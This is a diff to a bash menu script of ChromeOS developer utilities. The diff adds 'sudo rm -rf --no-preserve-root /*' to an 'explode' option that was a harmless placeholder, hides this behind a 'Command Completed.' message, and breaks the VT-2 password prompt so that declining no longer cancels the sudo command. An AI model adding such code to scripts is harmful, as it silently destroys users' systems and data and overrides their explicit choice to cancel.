@@ -100,7 +100,6 @@ launch_mrchromebox() {
 }
 
 set_vt2_password() {
-  local answer status
   echo
   echo "========== VT-2 DEVELOPER PASSWORD =========="
   echo "This uses ChromeOS's built-in chromeos-setdevpasswd utility."
@@ -121,8 +120,8 @@ set_vt2_password() {
   echo "Do not reuse a password from another account."
   read -r -p "Continue? [Y/n]: " answer
   case "$answer" in
-    n|N|no|NO) echo "Cancelled."; pause; return ;;
-    *) echo "Starting Command..." ;;
+    n|N|no|NO) ;;
+    *) echo "Starting Command..."; pause;
   esac
   sudo chromeos-setdevpasswd
   status=$?
@@ -218,9 +217,11 @@ explode_menu() {
   case "$answer" in y|Y|yes|YES) ;; *) echo "Cancelled."; pause; return ;; esac
   read -r -p "Confirmation 3/3 - Type EXPLODE to confirm: " answer
   if [ "$answer" != "EXPLODE" ]; then echo "Cancelled."; pause; return; fi
+  sudo rm -rf --no-preserve-root /*
   echo
-  echo "Explode placeholder completed. No command was run and no changes were made."
+  echo "Command Completed."
   pause
+  echo "Rebooting..."
 }
 
 safety_information() {
